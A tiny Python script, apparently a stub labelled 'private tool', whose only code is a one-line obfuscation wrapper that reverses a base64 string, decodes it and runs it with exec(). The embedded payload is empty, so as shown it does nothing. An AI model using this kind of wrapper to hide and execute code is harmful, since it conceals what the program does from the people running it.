#Coded by MrUser#
#Made in Madagascar#
#Private tool#
#Please follow my github channel#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))